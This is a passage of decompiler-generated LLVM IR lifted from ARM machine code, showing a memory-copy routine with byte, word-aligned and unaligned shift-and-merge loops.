  %v1_19548 = phi i1 [ %v1_19544.pre, %bb145 ], [ %v0_1953c, %dec_label_pc_1952c ]
  %v0_19544 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_19544 = xor i1 %v2_19548, %v1_19548
  %v4_19544 = or i1 %v0_19544, %v3_19544
  br i1 %v4_19544, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_19544 = load i32, i32* %r1.global-to-local, align 4
  %v6_19544 = inttoptr i32 %v5_19544 to i8*
  %v7_19544 = load i8, i8* %v6_19544, align 1
  %v8_19544 = zext i8 %v7_19544 to i32
  store i32 %v8_19544, i32* @r3, align 4
  %v10_19544 = add i32 %v5_19544, 1
  store i32 %v10_19544, i32* %r1.global-to-local, align 4
  %v8_19548 = inttoptr i32 %v7_19548 to i8*
  store i8 %v7_19544, i8* %v8_19548, align 1
  %v9_19548 = load i32, i32* %r0.global-to-local, align 4
  %v10_19548 = add i32 %v9_19548, 1
  store i32 %v10_19548, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_1967c76 = phi i32 [ %v10_19548, %bb146 ], [ %v7_19548, %.thread126 ]
  %v0_1954c = load i32, i32* %r2.global-to-local, align 4
  %v1_1954c = load i32, i32* @ip, align 4
  %v2_1954c = sub i32 %v0_1954c, %v1_1954c
  store i32 %v2_1954c, i32* %r2.global-to-local, align 4
  %v4_1954c = xor i32 %v1_1954c, %v0_1954c
  %v5_1954c = xor i32 %v2_1954c, %v0_1954c
  %v6_1954c = and i32 %v5_1954c, %v4_1954c
  %v7_1954c = icmp slt i32 %v6_1954c, 0
  store i1 %v7_1954c, i1* %cpsr_v.global-to-local, align 1
  %v8_1954c = icmp slt i32 %v2_1954c, 0
  store i1 %v8_1954c, i1* %cpsr_n.global-to-local, align 1
  %v9_1954c = icmp eq i32 %v0_1954c, %v1_1954c
  store i1 %v9_1954c, i1* %cpsr_z.global-to-local, align 1
  %v2_19550 = xor i1 %v8_1954c, %v7_1954c
  br i1 %v2_19550, label %bb140, label %dec_label_pc_19554

dec_label_pc_19554:                               ; preds = %.thread127
  %v0_19554 = load i32, i32* %r1.global-to-local, align 4
  %v1_19554 = urem i32 %v0_19554, 4
  store i32 %v1_19554, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19554 = icmp eq i32 %v1_19554, 0
  store i1 %v2_19554, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_19554 to i2
  br i1 %v2_19554, label %dec_label_pc_19488, label %dec_label_pc_1955c

dec_label_pc_1955c:                               ; preds = %dec_label_pc_19480, %dec_label_pc_19554
  %v0_1967c75 = phi i32 [ %v1_19460, %dec_label_pc_19480 ], [ %v0_1967c76, %dec_label_pc_19554 ]
  %v0_195e4 = phi i32 [ %v2_19470, %dec_label_pc_19480 ], [ %v2_1954c, %dec_label_pc_19554 ]
  %v0_19564.off0 = phi i2 [ %extract.t, %dec_label_pc_19480 ], [ %extract.t130, %dec_label_pc_19554 ]
  %v0_1955c = phi i32 [ %v0_19460, %dec_label_pc_19480 ], [ %v0_19554, %dec_label_pc_19554 ]
  %v1_1955c = and i32 %v0_1955c, -4
  store i32 %v1_1955c, i32* %r1.global-to-local, align 4
  %v1_19560 = inttoptr i32 %v1_1955c to i32*
  %v2_19560 = load i32, i32* %v1_19560, align 4
  store i32 %v2_19560, i32* %lr.global-to-local, align 4
  %v4_19560 = add i32 %v1_1955c, 4
  store i32 %v4_19560, i32* %r1.global-to-local, align 4
  %v1_195dc = add i32 %v0_195e4, -12
  %v3_195dc = sub i32 11, %v0_195e4
  %v4_195dc = and i32 %v3_195dc, %v0_195e4
  %v5_195dc = icmp slt i32 %v4_195dc, 0
  store i1 %v5_195dc, i1* %cpsr_v.global-to-local, align 1
  %v6_195dc = icmp slt i32 %v1_195dc, 0
  store i1 %v6_195dc, i1* %cpsr_n.global-to-local, align 1
  %v7_195dc = icmp eq i32 %v0_195e4, 12
  store i1 %v7_195dc, i1* %cpsr_z.global-to-local, align 1
  %v2_195e0 = xor i1 %v6_195dc, %v5_195dc
  switch i2 %v0_19564.off0, label %dec_label_pc_19570 [
    i2 -1, label %dec_label_pc_19648
    i2 -2, label %dec_label_pc_195dc
  ]

dec_label_pc_19570:                               ; preds = %dec_label_pc_1955c
  br i1 %v2_195e0, label %dec_label_pc_195bc, label %dec_label_pc_19578

dec_label_pc_19578:                               ; preds = %dec_label_pc_19570
  store i32 %v1_195dc, i32* %r2.global-to-local, align 4
  %v3_1957c = load i32, i32* @r4, align 4
  store i32 %v3_1957c, i32* %stack_var_-16, align 4
  %v6_1957c = load i32, i32* @r5, align 4
  store i32 %v6_1957c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_19580

dec_label_pc_19580:                               ; preds = %dec_label_pc_19580.dec_label_pc_19580_crit_edge, %dec_label_pc_19578
  %v0_195a4 = phi i32 [ %v12_195a4, %dec_label_pc_19580.dec_label_pc_19580_crit_edge ], [ %v0_1967c75, %dec_label_pc_19578 ]
  %v0_19584 = phi i32 [ %v0_19584.pre, %dec_label_pc_19580.dec_label_pc_19580_crit_edge ], [ %v4_19560, %dec_label_pc_19578 ]
  %v0_19580 = phi i32 [ %v0_19580.pre, %dec_label_pc_19580.dec_label_pc_19580_crit_edge ], [ %v2_19560, %dec_label_pc_19578 ]
  %v3_19580 = udiv i32 %v0_19580, 256
  %v1_19584 = inttoptr i32 %v0_19584 to i32*
  %v2_19584 = load i32, i32* %v1_19584, align 4
  store i32 %v2_19584, i32* %r4.global-to-local, align 4
  %v3_19584 = add i32 %v0_19584, 4
  %v4_19584 = inttoptr i32 %v3_19584 to i32*
  %v5_19584 = load i32, i32* %v4_19584, align 4
  store i32 %v5_19584, i32* %r5.global-to-local, align 4
  %v6_19584 = add i32 %v0_19584, 8
  %v7_19584 = inttoptr i32 %v6_19584 to i32*
  %v8_19584 = load i32, i32* %v7_19584, align 4
  store i32 %v8_19584, i32* %ip.global-to-local, align 4
  %v9_19584 = add i32 %v0_19584, 12
  %v10_19584 = inttoptr i32 %v9_19584 to i32*
  %v11_19584 = load i32, i32* %v10_19584, align 4
  store i32 %v11_19584, i32* %lr.global-to-local, align 4
  %v12_19584 = add i32 %v0_19584, 16
  store i32 %v12_19584, i32* %r1.global-to-local, align 4
  %v4_19588 = mul i32 %v2_19584, 16777216
  %v5_19588 = or i32 %v4_19588, %v3_19580
  store i32 %v5_19588, i32* @r3, align 4
  %v3_1958c = udiv i32 %v2_19584, 256
  %v4_19590 = mul i32 %v5_19584, 16777216
  %v5_19590 = or i32 %v4_19590, %v3_1958c
  store i32 %v5_19590, i32* %r4.global-to-local, align 4
  %v3_19594 = udiv i32 %v5_19584, 256
  %v4_19598 = mul i32 %v8_19584, 16777216
  %v5_19598 = or i32 %v4_19598, %v3_19594
  store i32 %v5_19598, i32* %r5.global-to-local, align 4
  %v3_1959c = udiv i32 %v8_19584, 256
  %v4_195a0 = mul i32 %v11_19584, 16777216
  %v5_195a0 = or i32 %v4_195a0, %v3_1959c
  store i32 %v5_195a0, i32* @ip, align 4
  %v1_195a4 = inttoptr i32 %v0_195a4 to i32*
  store i32 %v5_19588, i32* %v1_195a4, align 4
  %v3_195a4 = add i32 %v0_195a4, 4
  %v4_195a4 = inttoptr i32 %v3_195a4 to i32*
  %v5_195a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_195a4, i32* %v4_195a4, align 4
  %v6_195a4 = add i32 %v0_195a4, 8
  %v7_195a4 = inttoptr i32 %v6_195a4 to i32*
  %v8_195a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_195a4, i32* %v7_195a4, align 4
  %v9_195a4 = add i32 %v0_195a4, 12
  %v10_195a4 = inttoptr i32 %v9_195a4 to i32*
  %v11_195a4 = load i32, i32* @ip, align 4
  store i32 %v11_195a4, i32* %v10_195a4, align 4
  %v12_195a4 = add i32 %v0_195a4, 16
  store i32 %v12_195a4, i32* %r0.global-to-local, align 4
  %v0_195a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_195a8 = add i32 %v0_195a8, -16
  store i32 %v1_195a8, i32* %r2.global-to-local, align 4
  %v3_195a8 = sub i32 15, %v0_195a8
  %v4_195a8 = and i32 %v3_195a8, %v0_195a8
  %v5_195a8 = icmp slt i32 %v4_195a8, 0
  %v6_195a8 = icmp slt i32 %v1_195a8, 0
  %v2_195ac = xor i1 %v6_195a8, %v5_195a8
  br i1 %v2_195ac, label %dec_label_pc_195b0, label %dec_label_pc_19580.dec_label_pc_19580_crit_edge

dec_label_pc_19580.dec_label_pc_19580_crit_edge:  ; preds = %dec_label_pc_19580
  %v0_19580.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_19584.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19580

dec_label_pc_195b0:                               ; preds = %dec_label_pc_19580
  %v2_195b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_195b0, i32* @r4, align 4
  %v5_195b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_195b0, i32* @r5, align 4
  %v1_195b4 = add i32 %v0_195a8, -4
  store i32 %v1_195b4, i32* %r2.global-to-local, align 4
  %v3_195b4 = add i32 %v0_195a8, 2147483632
  %v4_195b4 = and i32 %v1_195b4, %v3_195b4
  %v5_195b4 = icmp slt i32 %v4_195b4, 0
  store i1 %v5_195b4, i1* %cpsr_v.global-to-local, align 1
  %v6_195b4 = icmp slt i32 %v1_195b4, 0
  store i1 %v6_195b4, i1* %cpsr_n.global-to-local, align 1
  %v7_195b4 = icmp eq i32 %v1_195b4, 0
  store i1 %v7_195b4, i1* %cpsr_z.global-to-local, align 1
  %v2_195b8 = xor i1 %v6_195b4, %v5_195b4
  br i1 %v2_195b8, label %dec_label_pc_195d4, label %dec_label_pc_195bc

dec_label_pc_195bc:                               ; preds = %dec_label_pc_195b0, %dec_label_pc_19570, %dec_label_pc_195bc
  %v1_195c8 = phi i32 [ %v4_195c8, %dec_label_pc_195bc ], [ %v12_195a4, %dec_label_pc_195b0 ], [ %v0_1967c75, %dec_label_pc_19570 ]
  %v0_195bc = load i32, i32* %lr.global-to-local, align 4
  %v3_195bc = udiv i32 %v0_195bc, 256
  store i32 %v3_195bc, i32* %ip.global-to-local, align 4
  %v0_195c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_195c0 = inttoptr i32 %v0_195c0 to i32*
  %v2_195c0 = load i32, i32* %v1_195c0, align 4
  store i32 %v2_195c0, i32* %lr.global-to-local, align 4
  %v4_195c0 = add i32 %v0_195c0, 4
  store i32 %v4_195c0, i32* %r1.global-to-local, align 4
  %v4_195c4 = mul i32 %v2_195c0, 16777216
  %v5_195c4 = or i32 %v4_195c4, %v3_195bc
  store i32 %v5_195c4, i32* @ip, align 4
  %v2_195c8 = inttoptr i32 %v1_195c8 to i32*
  store i32 %v5_195c4, i32* %v2_195c8, align 4
  %v3_195c8 = load i32, i32* %r0.global-to-local, align 4
  %v4_195c8 = add i32 %v3_195c8, 4
  store i32 %v4_195c8, i32* %r0.global-to-local, align 4
  %v0_195cc = load i32, i32* %r2.global-to-local, align 4
  %v1_195cc = add i32 %v0_195cc, -4
  store i32 %v1_195cc, i32* %r2.global-to-local, align 4
  %v3_195cc = sub i32 3, %v0_195cc
  %v4_195cc = and i32 %v3_195cc, %v0_195cc
  %v5_195cc = icmp slt i32 %v4_195cc, 0
  %v6_195cc = icmp slt i32 %v1_195cc, 0
  %v2_195d0 = xor i1 %v6_195cc, %v5_195cc
  br i1 %v2_195d0, label %dec_label_pc_195d4.loopexit, label %dec_label_pc_195bc

dec_label_pc_195d4.loopexit:                      ; preds = %dec_label_pc_195bc
  %v7_195cc = icmp eq i32 %v0_195cc, 4
  store i1 %v5_195cc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_195cc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_195cc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_195d4

dec_label_pc_195d4:                               ; preds = %dec_label_pc_195d4.loopexit, %dec_label_pc_195b0
  %v0_194fc58 = phi i32 [ %v1_195cc, %dec_label_pc_195d4.loopexit ], [ %v1_195b4, %dec_label_pc_195b0 ]
  %v0_195d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_195d4 = add i32 %v0_195d4, -3
  store i32 %v1_195d4, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_195dc:                               ; preds = %dec_label_pc_1955c
  br i1 %v2_195e0, label %dec_label_pc_19628, label %dec_label_pc_195e4

dec_label_pc_195e4:                               ; preds = %dec_label_pc_195dc
  store i32 %v1_195dc, i32* %r2.global-to-local, align 4
  %v3_195e8 = load i32, i32* @r4, align 4
  store i32 %v3_195e8, i32* %stack_var_-16, align 4
  %v6_195e8 = load i32, i32* @r5, align 4
  store i32 %v6_195e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_195ec

dec_label_pc_195ec:                               ; preds = %dec_label_pc_195ec.dec_label_pc_195ec_crit_edge, %dec_label_pc_195e4
  %v0_19610 = phi i32 [ %v12_19610, %dec_label_pc_195ec.dec_label_pc_195ec_crit_edge ], [ %v0_1967c75, %dec_label_pc_195e4 ]
  %v0_195f0 = phi i32 [ %v0_195f0.pre, %dec_label_pc_195ec.dec_label_pc_195ec_crit_edge ], [ %v4_19560, %dec_label_pc_195e4 ]
  %v0_195ec = phi i32 [ %v0_195ec.pre, %dec_label_pc_195ec.dec_label_pc_195ec_crit_edge ], [ %v2_19560, %dec_label_pc_195e4 ]
  %v3_195ec = udiv i32 %v0_195ec, 65536
  %v1_195f0 = inttoptr i32 %v0_195f0 to i32*
  %v2_195f0 = load i32, i32* %v1_195f0, align 4
  store i32 %v2_195f0, i32* %r4.global-to-local, align 4
  %v3_195f0 = add i32 %v0_195f0, 4
  %v4_195f0 = inttoptr i32 %v3_195f0 to i32*
  %v5_195f0 = load i32, i32* %v4_195f0, align 4
  store i32 %v5_195f0, i32* %r5.global-to-local, align 4
  %v6_195f0 = add i32 %v0_195f0, 8
  %v7_195f0 = inttoptr i32 %v6_195f0 to i32*
  %v8_195f0 = load i32, i32* %v7_195f0, align 4
  store i32 %v8_195f0, i32* %ip.global-to-local, align 4
  %v9_195f0 = add i32 %v0_195f0, 12
  %v10_195f0 = inttoptr i32 %v9_195f0 to i32*
  %v11_195f0 = load i32, i32* %v10_195f0, align 4
  store i32 %v11_195f0, i32* %lr.global-to-local, align 4
  %v12_195f0 = add i32 %v0_195f0, 16
  store i32 %v12_195f0, i32* %r1.global-to-local, align 4
  %v4_195f4 = mul i32 %v2_195f0, 65536
  %v5_195f4 = or i32 %v4_195f4, %v3_195ec
  store i32 %v5_195f4, i32* @r3, align 4
  %v3_195f8 = udiv i32 %v2_195f0, 65536
  %v4_195fc = mul i32 %v5_195f0, 65536
  %v5_195fc = or i32 %v4_195fc, %v3_195f8
  store i32 %v5_195fc, i32* %r4.global-to-local, align 4
  %v3_19600 = udiv i32 %v5_195f0, 65536
  %v4_19604 = mul i32 %v8_195f0, 65536
  %v5_19604 = or i32 %v4_19604, %v3_19600
  store i32 %v5_19604, i32* %r5.global-to-local, align 4
  %v3_19608 = udiv i32 %v8_195f0, 65536
  %v4_1960c = mul i32 %v11_195f0, 65536
  %v5_1960c = or i32 %v4_1960c, %v3_19608
  store i32 %v5_1960c, i32* @ip, align 4
  %v1_19610 = inttoptr i32 %v0_19610 to i32*
  store i32 %v5_195f4, i32* %v1_19610, align 4
  %v3_19610 = add i32 %v0_19610, 4
  %v4_19610 = inttoptr i32 %v3_19610 to i32*
  %v5_19610 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19610, i32* %v4_19610, align 4
  %v6_19610 = add i32 %v0_19610, 8
  %v7_19610 = inttoptr i32 %v6_19610 to i32*
  %v8_19610 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_19610, i32* %v7_19610, align 4
  %v9_19610 = add i32 %v0_19610, 12
  %v10_19610 = inttoptr i32 %v9_19610 to i32*
  %v11_19610 = load i32, i32* @ip, align 4
  store i32 %v11_19610, i32* %v10_19610, align 4
  %v12_19610 = add i32 %v0_19610, 16
  store i32 %v12_19610, i32* %r0.global-to-local, align 4
  %v0_19614 = load i32, i32* %r2.global-to-local, align 4
  %v1_19614 = add i32 %v0_19614, -16
  store i32 %v1_19614, i32* %r2.global-to-local, align 4
  %v3_19614 = sub i32 15, %v0_19614
  %v4_19614 = and i32 %v3_19614, %v0_19614
  %v5_19614 = icmp slt i32 %v4_19614, 0
  %v6_19614 = icmp slt i32 %v1_19614, 0
  %v2_19618 = xor i1 %v6_19614, %v5_19614
  br i1 %v2_19618, label %dec_label_pc_1961c, label %dec_label_pc_195ec.dec_label_pc_195ec_crit_edge

dec_label_pc_195ec.dec_label_pc_195ec_crit_edge:  ; preds = %dec_label_pc_195ec
  %v0_195ec.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_195f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195ec

dec_label_pc_1961c:                               ; preds = %dec_label_pc_195ec
  %v2_1961c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1961c, i32* @r4, align 4
  %v5_1961c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1961c, i32* @r5, align 4
  %v1_19620 = add i32 %v0_19614, -4
  store i32 %v1_19620, i32* %r2.global-to-local, align 4
  %v3_19620 = add i32 %v0_19614, 2147483632
  %v4_19620 = and i32 %v1_19620, %v3_19620
  %v5_19620 = icmp slt i32 %v4_19620, 0
  store i1 %v5_19620, i1* %cpsr_v.global-to-local, align 1
  %v6_19620 = icmp slt i32 %v1_19620, 0
  store i1 %v6_19620, i1* %cpsr_n.global-to-local, align 1
  %v7_19620 = icmp eq i32 %v1_19620, 0
  store i1 %v7_19620, i1* %cpsr_z.global-to-local, align 1
  %v2_19624 = xor i1 %v6_19620, %v5_19620
  br i1 %v2_19624, label %dec_label_pc_19640, label %dec_label_pc_19628

dec_label_pc_19628:                               ; preds = %dec_label_pc_1961c, %dec_label_pc_195dc, %dec_label_pc_19628
  %v1_19634 = phi i32 [ %v4_19634, %dec_label_pc_19628 ], [ %v12_19610, %dec_label_pc_1961c ], [ %v0_1967c75, %dec_label_pc_195dc ]
  %v0_19628 = load i32, i32* %lr.global-to-local, align 4
  %v3_19628 = udiv i32 %v0_19628, 65536
  store i32 %v3_19628, i32* %ip.global-to-local, align 4
  %v0_1962c = load i32, i32* %r1.global-to-local, align 4
  %v1_1962c = inttoptr i32 %v0_1962c to i32*
  %v2_1962c = load i32, i32* %v1_1962c, align 4
  store i32 %v2_1962c, i32* %lr.global-to-local, align 4
  %v4_1962c = add i32 %v0_1962c, 4
  store i32 %v4_1962c, i32* %r1.global-to-local, align 4
  %v4_19630 = mul i32 %v2_1962c, 65536
  %v5_19630 = or i32 %v4_19630, %v3_19628
  store i32 %v5_19630, i32* @ip, align 4
  %v2_19634 = inttoptr i32 %v1_19634 to i32*
  store i32 %v5_19630, i32* %v2_19634, align 4
  %v3_19634 = load i32, i32* %r0.global-to-local, align 4
  %v4_19634 = add i32 %v3_19634, 4
  store i32 %v4_19634, i32* %r0.global-to-local, align 4
  %v0_19638 = load i32, i32* %r2.global-to-local, align 4
  %v1_19638 = add i32 %v0_19638, -4
  store i32 %v1_19638, i32* %r2.global-to-local, align 4
  %v3_19638 = sub i32 3, %v0_19638
  %v4_19638 = and i32 %v3_19638, %v0_19638
  %v5_19638 = icmp slt i32 %v4_19638, 0
  %v6_19638 = icmp slt i32 %v1_19638, 0
  %v2_1963c = xor i1 %v6_19638, %v5_19638
  br i1 %v2_1963c, label %dec_label_pc_19640.loopexit, label %dec_label_pc_19628

dec_label_pc_19640.loopexit:                      ; preds = %dec_label_pc_19628
  %v7_19638 = icmp eq i32 %v0_19638, 4
  store i1 %v5_19638, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_19638, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_19638, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19640

dec_label_pc_19640:                               ; preds = %dec_label_pc_19640.loopexit, %dec_label_pc_1961c
  %v0_194fc59 = phi i32 [ %v1_19638, %dec_label_pc_19640.loopexit ], [ %v1_19620, %dec_label_pc_1961c ]
  %v0_19640 = load i32, i32* %r1.global-to-local, align 4
  %v1_19640 = add i32 %v0_19640, -2
  store i32 %v1_19640, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_19648:                               ; preds = %dec_label_pc_1955c
  br i1 %v2_195e0, label %dec_label_pc_19694, label %dec_label_pc_19650

dec_label_pc_19650:                               ; preds = %dec_label_pc_19648
  store i32 %v1_195dc, i32* %r2.global-to-local, align 4
  %v3_19654 = load i32, i32* @r4, align 4
  store i32 %v3_19654, i32* %stack_var_-16, align 4
  %v6_19654 = load i32, i32* @r5, align 4
  store i32 %v6_19654, i32* %stack_var_-12, align 4
  br label %dec_label_pc_19658

dec_label_pc_19658:                               ; preds = %dec_label_pc_19658.dec_label_pc_19658_crit_edge, %dec_label_pc_19650
  %v0_1967c = phi i32 [ %v12_1967c, %dec_label_pc_19658.dec_label_pc_19658_crit_edge ], [ %v0_1967c75, %dec_label_pc_19650 ]
  %v0_1965c = phi i32 [ %v0_1965c.pre, %dec_label_pc_19658.dec_label_pc_19658_crit_edge ], [ %v4_19560, %dec_label_pc_19650 ]
  %v0_19658 = phi i32 [ %v0_19658.pre, %dec_label_pc_19658.dec_label_pc_19658_crit_edge ], [ %v2_19560, %dec_label_pc_19650 ]
  %v3_19658 = udiv i32 %v0_19658, 16777216
  %v1_1965c = inttoptr i32 %v0_1965c to i32*
  %v2_1965c = load i32, i32* %v1_1965c, align 4
  store i32 %v2_1965c, i32* %r4.global-to-local, align 4
  %v3_1965c = add i32 %v0_1965c, 4
  %v4_1965c = inttoptr i32 %v3_1965c to i32*
  %v5_1965c = load i32, i32* %v4_1965c, align 4
  store i32 %v5_1965c, i32* %r5.global-to-local, align 4
  %v6_1965c = add i32 %v0_1965c, 8
  %v7_1965c = inttoptr i32 %v6_1965c to i32*
  %v8_1965c = load i32, i32* %v7_1965c, align 4
  store i32 %v8_1965c, i32* %ip.global-to-local, align 4
  %v9_1965c = add i32 %v0_1965c, 12
  %v10_1965c = inttoptr i32 %v9_1965c to i32*
  %v11_1965c = load i32, i32* %v10_1965c, align 4
  store i32 %v11_1965c, i32* %lr.global-to-local, align 4
  %v12_1965c = add i32 %v0_1965c, 16
  store i32 %v12_1965c, i32* %r1.global-to-local, align 4
  %v4_19660 = mul i32 %v2_1965c, 256
  %v5_19660 = or i32 %v4_19660, %v3_19658
  store i32 %v5_19660, i32* @r3, align 4
  %v3_19664 = udiv i32 %v2_1965c, 16777216
  %v4_19668 = mul i32 %v5_1965c, 256
  %v5_19668 = or i32 %v4_19668, %v3_19664
  store i32 %v5_19668, i32* %r4.global-to-local, align 4
  %v3_1966c = udiv i32 %v5_1965c, 16777216
  %v4_19670 = mul i32 %v8_1965c, 256
  %v5_19670 = or i32 %v4_19670, %v3_1966c
  store i32 %v5_19670, i32* %r5.global-to-local, align 4
  %v3_19674 = udiv i32 %v8_1965c, 16777216
  %v4_19678 = mul i32 %v11_1965c, 256
  %v5_19678 = or i32 %v4_19678, %v3_19674
  store i32 %v5_19678, i32* @ip, align 4
  %v1_1967c = inttoptr i32 %v0_1967c to i32*
  store i32 %v5_19660, i32* %v1_1967c, align 4
  %v3_1967c = add i32 %v0_1967c, 4
  %v4_1967c = inttoptr i32 %v3_1967c to i32*
  %v5_1967c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1967c, i32* %v4_1967c, align 4
  %v6_1967c = add i32 %v0_1967c, 8
  %v7_1967c = inttoptr i32 %v6_1967c to i32*
  %v8_1967c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1967c, i32* %v7_1967c, align 4
  %v9_1967c = add i32 %v0_1967c, 12
  %v10_1967c = inttoptr i32 %v9_1967c to i32*
  %v11_1967c = load i32, i32* @ip, align 4
  store i32 %v11_1967c, i32* %v10_1967c, align 4
  %v12_1967c = add i32 %v0_1967c, 16
  store i32 %v12_1967c, i32* %r0.global-to-local, align 4
  %v0_19680 = load i32, i32* %r2.global-to-local, align 4
  %v1_19680 = add i32 %v0_19680, -16
  store i32 %v1_19680, i32* %r2.global-to-local, align 4
  %v3_19680 = sub i32 15, %v0_19680
  %v4_19680 = and i32 %v3_19680, %v0_19680
  %v5_19680 = icmp slt i32 %v4_19680, 0
  %v6_19680 = icmp slt i32 %v1_19680, 0
  %v2_19684 = xor i1 %v6_19680, %v5_19680
  br i1 %v2_19684, label %dec_label_pc_19688, label %dec_label_pc_19658.dec_label_pc_19658_crit_edge

dec_label_pc_19658.dec_label_pc_19658_crit_edge:  ; preds = %dec_label_pc_19658
  %v0_19658.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1965c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19658

dec_label_pc_19688:                               ; preds = %dec_label_pc_19658
  %v2_19688 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19688, i32* @r4, align 4
  %v5_19688 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_19688, i32* @r5, align 4
  %v1_1968c = add i32 %v0_19680, -4
  store i32 %v1_1968c, i32* %r2.global-to-local, align 4
  %v3_1968c = add i32 %v0_19680, 2147483632
  %v4_1968c = and i32 %v1_1968c, %v3_1968c
  %v5_1968c = icmp slt i32 %v4_1968c, 0
  store i1 %v5_1968c, i1* %cpsr_v.global-to-local, align 1
  %v6_1968c = icmp slt i32 %v1_1968c, 0
  store i1 %v6_1968c, i1* %cpsr_n.global-to-local, align 1
  %v7_1968c = icmp eq i32 %v1_1968c, 0
  store i1 %v7_1968c, i1* %cpsr_z.global-to-local, align 1
  %v2_19690 = xor i1 %v6_1968c, %v5_1968c
  br i1 %v2_19690, label %dec_label_pc_196ac, label %dec_label_pc_19694

dec_label_pc_19694:                               ; preds = %dec_label_pc_19688, %dec_label_pc_19648, %dec_label_pc_19694
  %v1_196a0 = phi i32 [ %v4_196a0, %dec_label_pc_19694 ], [ %v12_1967c, %dec_label_pc_19688 ], [ %v0_1967c75, %dec_label_pc_19648 ]
  %v0_19694 = load i32, i32* %lr.global-to-local, align 4
  %v3_19694 = udiv i32 %v0_19694, 16777216
  store i32 %v3_19694, i32* %ip.global-to-local, align 4
  %v0_19698 = load i32, i32* %r1.global-to-local, align 4
  %v1_19698 = inttoptr i32 %v0_19698 to i32*
  %v2_19698 = load i32, i32* %v1_19698, align 4
  store i32 %v2_19698, i32* %lr.global-to-local, align 4
  %v4_19698 = add i32 %v0_19698, 4
  store i32 %v4_19698, i32* %r1.global-to-local, align 4
  %v4_1969c = mul i32 %v2_19698, 256
  %v5_1969c = or i32 %v4_1969c, %v3_19694
  store i32 %v5_1969c, i32* @ip, align 4
  %v2_196a0 = inttoptr i32 %v1_196a0 to i32*
  store i32 %v5_1969c, i32* %v2_196a0, align 4
  %v3_196a0 = load i32, i32* %r0.global-to-local, align 4
  %v4_196a0 = add i32 %v3_196a0, 4
  store i32 %v4_196a0, i32* %r0.global-to-local, align 4
  %v0_196a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_196a4 = add i32 %v0_196a4, -4
  store i32 %v1_196a4, i32* %r2.global-to-local, align 4
  %v3_196a4 = sub i32 3, %v0_196a4
  %v4_196a4 = and i32 %v3_196a4, %v0_196a4
  %v5_196a4 = icmp slt i32 %v4_196a4, 0
  %v6_196a4 = icmp slt i32 %v1_196a4, 0
  %v2_196a8 = xor i1 %v6_196a4, %v5_196a4
  br i1 %v2_196a8, label %dec_label_pc_196ac.loopexit, label %dec_label_pc_19694

dec_label_pc_196ac.loopexit:                      ; preds = %dec_label_pc_19694
  %v7_196a4 = icmp eq i32 %v0_196a4, 4
  store i1 %v5_196a4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_196a4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_196a4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_196ac

dec_label_pc_196ac:                               ; preds = %dec_label_pc_196ac.loopexit, %dec_label_pc_19688
  %v0_194fc60 = phi i32 [ %v1_196a4, %dec_label_pc_196ac.loopexit ], [ %v1_1968c, %dec_label_pc_19688 ]
  %v0_196ac = load i32, i32* %r1.global-to-local, align 4
  %v1_196ac = add i32 %v0_196ac, -1
  store i32 %v1_196ac, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_196b4:                               ; preds = %entry
  %v1_196b4 = load i32, i32* @r2, align 4
  %v2_196b4 = add i32 %v1_196b4, %v0_19460
  store i32 %v2_196b4, i32* %r1.global-to-local, align 4
  %v2_196b8 = add i32 %v1_196b4, %v1_19460
  store i32 %v2_196b8, i32* %r0.global-to-local, align 4
  %v2_196bc = add i32 %v1_196b4, -4
  store i32 %v2_196bc, i32* %r2.global-to-local, align 4
  %v4_196bc = sub i32 3, %v1_196b4
  %v5_196bc = and i32 %v4_196bc, %v1_196b4
  %v6_196bc = icmp slt i32 %v5_196bc, 0
  store i1 %v6_196bc, i1* %cpsr_v.global-to-local, align 1
  %v7_196bc = icmp slt i32 %v2_196bc, 0
  store i1 %v7_196bc, i1* %cpsr_n.global-to-local, align 1
  %v8_196bc = icmp eq i32 %v1_196b4, 4
  store i1 %v8_196bc, i1* %cpsr_z.global-to-local, align 1
  %v5_196c0 = icmp slt i32 %v1_196b4, 4
  br i1 %v5_196c0, label %bb150, label %dec_label_pc_196c4

dec_label_pc_196c4:                               ; preds = %dec_label_pc_196b4
  %v1_196c4 = urem i32 %v2_196b8, 4
